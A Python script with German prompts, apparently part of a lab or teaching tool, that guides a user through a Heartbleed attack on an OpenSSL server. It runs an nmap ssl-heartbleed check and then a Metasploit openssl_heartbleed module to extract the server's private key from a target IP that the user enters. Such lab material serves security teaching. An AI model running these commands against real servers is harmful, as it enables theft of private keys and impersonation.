#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import readline
import colors

from generics import rlinput, execute, clearScreen

def StartHeartbleedMetasploit():
	shellCols = colors.ShellColors
	showMenu = True
	while(showMenu):
		clearScreen()
		print(shellCols.UNDERLINE + shellCols.HEADER + 'Angriff auf OpenSSL Heartbleed: ' + shellCols.ENDC + '\n')

		# IP des Opfers
		print('Zuerst wird die IP-Adresse des Opfers benötigt, auf welchem der verwundbare OpenSSL-Server läuft. Wurde dieser auf dem selben Rechner gestartet, lautet diese 127.0.0.1 (localhost).')
		ip = rlinput("Gib die IP-Adresse des Zielservers ein: ", "127.0.0.1")


		# Port
		print("\n\nAuch der Https-Port des Dienstes wird benötigt. Standardmäßig lautet er 8989.")
		port = rlinput("Gib den Port des Zieldienstes ein: ", "8989")

		# NMAP
		print("\n\nAnschließend kann mit Nmap geprüft werden, ob der Server für Heartbleed anfällig ist. Hierzu verfügt Nmap über ein entsprechendes Plugin.")
		command = rlinput("# ", "nmap --script ssl-heartbleed -sV -p %s %s" % (port, ip))
		os.system(command)
		print("\n\nNmap sollte für den Dienst ausgeben, dass er für Heartbleed verwundbar ist: \nssl-heartbleed:VULNERABLE")



		# metasploit
		print("\n\nNun wird ein metasploit Plugin konfiguriert und gestartet, welches versucht, den Private Key des Servers auszulesen.")
		command = rlinput("# ", "msfconsole -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set action KEYS; set RHOSTS %s; set RPORT %s; set verbose true; exploit; exit;'" % (ip, port))
		os.system(command)

		print("\n\nWar der Exploit erfolgreich, wurde der Private Key des Servers ausgegeben.")


		# Beenden
		selection = raw_input(shellCols.BLUE + '\nDrücke 0 um zum Menü zurückzukehren.' + shellCols.ENDC)
		print('Gehe zurück zum Hauptmenü')
		showMenu = False
		break